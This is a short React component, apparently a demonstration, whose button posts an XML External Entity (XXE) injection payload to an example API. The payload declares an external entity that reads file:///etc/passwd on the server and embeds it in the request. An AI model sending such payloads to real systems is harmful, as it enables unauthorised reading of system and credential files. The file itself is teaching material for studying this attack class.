// Conceptual example for demonstration

import React from 'react';
import axios from 'axios';

const XXEInjectionExample: React.FC = () => {
  const sendXmlData = async () => {
    const xmlData = `
      <?xml version="1.0"?>
      <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <foo>&xxe;</foo>
    `; // Example of XML with external entity

    try {
      const response = await axios.post('https://example.com/api/xml', xmlData, {
        headers: { 'Content-Type': 'application/xml' }
      });
      console.log(response.data);
    } catch (error) {
      console.error('Error sending XML data:', error);
    }
  };

  return <button onClick={sendXmlData}>Send XML Data</button>;
};

export default XXEInjectionExample;
